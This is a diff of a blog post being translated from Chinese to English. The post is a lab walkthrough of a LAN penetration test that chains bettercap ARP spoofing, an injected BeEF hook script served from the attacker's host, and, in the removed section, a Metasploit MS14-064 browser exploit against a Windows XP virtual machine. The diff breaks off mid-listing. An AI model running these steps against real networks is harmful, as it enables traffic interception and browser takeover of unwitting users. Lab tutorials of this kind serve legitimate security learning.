@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试 - WeepingDogel</title><meta name="Description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."><meta property="og:title" content=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" />
-<meta property="og:description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." />
+        <title>LAN Penetration Testing with Beef, Bettercap, and Other Tools - WeepingDogel</title><meta name="Description" content="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."><meta property="og:title" content="LAN Penetration Testing with Beef, Bettercap, and Other Tools" />
+<meta property="og:description" content="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" /><meta property="og:image" content="http://weepingdogel.github.io/photo_2021-07-21_03-31-50.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-02T13:43:23+08:00" />
@@ -14,27 +14,27 @@
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://weepingdogel.github.io/photo_2021-07-21_03-31-50.jpg"/>
 
-<meta name="twitter:title" content=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"/>
-<meta name="twitter:description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."/>
+<meta name="twitter:title" content="LAN Penetration Testing with Beef, Bettercap, and Other Tools"/>
+<meta name="twitter:description" content="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."/>
 <meta name="application-name" content="LoveIt">
 <meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" /><link rel="prev" href="http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/" /><link rel="next" href="http://weepingdogel.github.io/posts/%E5%AD%A6gtk%E8%AE%B0/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4" /><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" /><link rel="prev" href="http://weepingdogel.github.io/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/" /><link rel="next" href="http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4" /><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": " Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试",
-        "inLanguage": "zh-CN",
+        "headline": "LAN Penetration Testing with Beef, Bettercap, and Other Tools",
+        "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/weepingdogel.github.io\/posts\/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\/"
-        },"genre": "posts","keywords": "beef, bettercap, Linux, metasploit, 笔记, 渗透测试, ARP 欺骗, 黑客","wordcount":  2055 ,
+        },"genre": "posts","keywords": "beef, bettercap, Linux, metasploit, notes, penetration testing, ARP spoofing, hackers","wordcount":  606 ,
         "url": "http:\/\/weepingdogel.github.io\/posts\/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\/","datePublished": "2021-02-02T13:43:23+08:00","dateModified": "2021-02-02T13:43:23+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
                 "name": "WeepingDogel"
-            },"description": "先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."
+            },"description": "Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."
     }
     </script></head>
     <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
@@ -52,7 +52,9 @@
         title="/photo_2021-07-21_03-31-50.jpg" />WeepingDogel</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/notes/"> 笔记 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About Me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language"><i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">简体中文</option><option value="/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" selected></option></select>
+                    </a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                 </a>
             </div>
@@ -75,9 +77,11 @@
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/notes/" title="">笔记</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
-            </a></div>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language"><i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">简体中文</option><option value="/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" selected></option></select>
+                </a></div>
     </div>
 </header>
 <div class="search-dropdown desktop">
@@ -88,12 +92,12 @@
 </div>
 <main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">目录</h2>
+            <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX"> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://weepingdogel.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>WeepingDogel</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-02">2021-02-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2055 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">LAN Penetration Testing with Beef, Bettercap, and Other Tools</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://weepingdogel.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>WeepingDogel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw"></i>Penetration testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-02">2021-02-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;606 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -101,73 +105,70 @@
         data-srcset="/img/2021-02-02_13-51.png, /img/2021-02-02_13-51.png 1.5x, /img/2021-02-02_13-51.png 2x"
         data-sizes="auto"
         alt="/img/2021-02-02_13-51.png"
-        title="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." /></div><div class="details toc" id="toc-static"  kept="">
+        title="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads." /></div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
-                    <span>目录</span>
+                    <span>Contents</span>
                     <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li>
       <ul>
-        <li><a href="#序">序</a>
+        <li><a href="#introduction">Introduction</a>
           <ul>
-            <li><a href="#测试环境">测试环境</a></li>
-            <li><a href="#用到的工具">用到的工具</a></li>
+            <li><a href="#testing-environment">Testing Environment</a></li>
+            <li><a href="#tools-used">Tools Used</a></li>
           </ul>
         </li>
-        <li><a href="#测试过程">测试过程</a></li>
-        <li><a href="#结尾">结尾</a></li>
-        <li><a href="#参考链接">参考链接</a></li>
+        <li><a href="#testing-process">Testing Process</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="序">序</h2>
-<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
-<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
-<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
-<p>不多说啦，我们开始～</p>
-<h3 id="测试环境">测试环境</h3>
-<p>啊咧，先说说测试环境。</p>
+            </div><div class="content" id="content"><h2 id="introduction">Introduction</h2>
+<p>Well&hellip; Let&rsquo;s start with some rambling as usual&hellip;</p>
+<p>Today, I tried using Beef and Bettercap together and found them to be quite effective~</p>
+<p>Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~</p>
+<p>Without further ado, let&rsquo;s get started~</p>
+<h3 id="testing-environment">Testing Environment</h3>
+<p>First, let&rsquo;s talk about the testing environment.</p>
 <ul>
 <li>
-<p>攻击机</p>
+<p>Attacker machine</p>
 <ul>
 <li>Arch Linux</li>
 <li>192.168.101.15</li>
 </ul>
 </li>
 <li>
-<p>靶机</p>
+<p>Target machine</p>
 <ul>
 <li>Windows XP on VirtualBox</li>
 <li>192.168.101.43</li>
 </ul>
 </li>
 </ul>
-<p>条件有限，就只能用 XP 啦～</p>
-<h3 id="用到的工具">用到的工具</h3>
+<p>Due to limited resources, we can only use Windows XP for this demonstration~</p>
+<h3 id="tools-used">Tools Used</h3>
 <ol>
-<li>bettercap
+<li>Bettercap
 <ul>
-<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
+<li>First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks&hellip;</li>
 </ul>
 </li>
-<li>beef
+<li>Beef
 <ul>
-<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
+<li>Used for browser hijacking&hellip; and it can do many things, but I don&rsquo;t know the specifics.</li>
 </ul>
 </li>
-<li>msf
+<li>Metasploit (msf)
 <ul>
-<li>这个就是老朋友啦～</li>
+<li>Our old friend~</li>
 </ul>
 </li>
 </ol>
-<p>什么? nmap? 这次用不着哦～</p>
-<h2 id="测试过程">测试过程</h2>
-<p>首先是打开 <code>bettercap</code></p>
+<h2 id="testing-process">Testing Process</h2>
+<p>First, let&rsquo;s open <code>bettercap</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -176,7 +177,7 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>然后我们会看到这样的返回结果..</p>
+</div><p>Then we will see the following output..</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -185,7 +186,7 @@
         data-sizes="auto"
         alt="/img/2021-02-02_14-18.png"
         title="/img/2021-02-02_14-18.png" /></p>
-<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
+<p><strong>Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don&rsquo;t use sudo, you will see a prompt like this.</strong></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -194,7 +195,7 @@
         data-sizes="auto"
         alt="/img/2021-02-02_14-20.png"
         title="/img/2021-02-02_14-20.png" /></p>
-<p>然后设置 arp 欺骗的目标：</p>
+<p>Next, set the target for ARP spoofing:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -203,8 +204,8 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
-<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
+</div><p><strong>Here, the targets are set to the IP address of the target machine.</strong></p>
+<p>Next, start Beef, and remember to use <code>sudo</code> as mentioned earlier.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -213,7 +214,7 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>得到返回：</p>
+</div><p>The output should be like this:</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -222,29 +223,29 @@
         data-sizes="auto"
         alt="/img/2021-02-02_14-28.png"
         title="/img/2021-02-02_14-28.png" /></p>
-<p>那么来说说终端里显示的这几个链接</p>
+<p>Now, let&rsquo;s talk about the links displayed in the terminal:</p>
 <ul>
-<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
+<li>Hook URL:  <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
 <ul>
-<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
-<li>一会儿我们要把它写进一个攻击脚本里～</li>
+<li>This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
+Later, we will write it into an attack script~</li>
 </ul>
 </li>
 <li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
 <ul>
-<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
-<img
+<li>This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.</li>
+</ul>
+</li>
+</ul>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png"
         data-srcset="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png, /img/Screenshot_2021-02-02_BeEF_Control_Panel.png 1.5x, /img/Screenshot_2021-02-02_BeEF_Control_Panel.png 2x"
         data-sizes="auto"
         alt="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png"
-        title="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png" /></li>
-</ul>
-</li>
-</ul>
-<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
+        title="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png" /></p>
+<p>About the username and password, here&rsquo;s the thing: In some systems, you can&rsquo;t use the default login credentials <code>(beef:beef)</code> for Beef, and it may not even start. For example, this is the case with my Arch Linux.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -255,8 +256,8 @@
 </span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
-<p>改成这样</p>
+</div><p>In such cases, what you need to do is modify the <code>config.yaml</code> file. In my case, the file is located at <code>/usr/share/beef/config.yaml</code>.</p>
+<p>Modify it as follows:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -287,13 +288,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;随便起个名字&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;随便想个密码&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;Choose a username&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Think of a password&#34;</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
-<p>好了，话不多说，我们继续。</p>
-<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
+</div><p>After that, you can start the system, and the username and password you set will be used for login.</p>
+<p>Alright, without further ado, let&rsquo;s continue.</p>
+<p>Next, we need to write a JavaScript script to use with Bettercap.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -322,8 +323,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
-<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
+</div><p>Save this file to a directory of your choice. I will save it to <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code>.</p>
+<p>Then, let&rsquo;s go back to Bettercap and set the <code>http.proxy.script</code> parameter to the path mentioned above:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -332,7 +333,7 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
+</div><p>Then start <code>net.probe</code>, <code>arp.spoof</code>, and <code>http.proxy</code> in sequence.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -357,7 +358,7 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
+</div><p>Alright&hellip; Now everything is set up and ready to go&hellip;</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -366,8 +367,8 @@
         data-sizes="auto"
         alt="/img/2021-02-02_15-12.png"
         title="/img/2021-02-02_15-12.png" /></p>
-<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
-<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
+<p>Then we&rsquo;ll have the target machine open a browser and visit a website&hellip;</p>
+<p>Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -384,308 +385,47 @@
         data-sizes="auto"
         alt="/img/2021-02-02_15-25.png"
         title="/img/2021-02-02_15-25.png" /></p>
-<p>然后我们能做的事情就很多了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-27.png"
-        data-srcset="/img/2021-02-02_15-27.png, /img/2021-02-02_15-27.png 1.5x, /img/2021-02-02_15-27.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-27.png"
-        title="/img/2021-02-02_15-27.png" /></p>
-<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-31.png"
-        data-srcset="/img/2021-02-02_15-31.png, /img/2021-02-02_15-31.png 1.5x, /img/2021-02-02_15-31.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-31.png"
-        title="/img/2021-02-02_15-31.png" /></p>
-<p>启用模块</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">use exploit/windows/browser/ms14_064_ole_code_execution
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>看看模块的描述</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">info 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
-<p>Description:</p>
-<p>This module exploits the Windows OLE Automation array vulnerability,
-CVE-2014-6332. The vulnerability is known to affect Internet
-Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
-and no patch for Windows XP. However, this exploit will only target
-Windows XP and Windows 7 box due to the Powershell limitation.
-Windows XP by defaults supports VBS, therefore it is used as the
-attack vector. On other newer Windows systems, the exploit will try
-using Powershell instead.</p>
-</blockquote>
-<p>机翻一下就是：</p>
-<blockquote>
-<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
-</blockquote>
-<p>看看设置</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
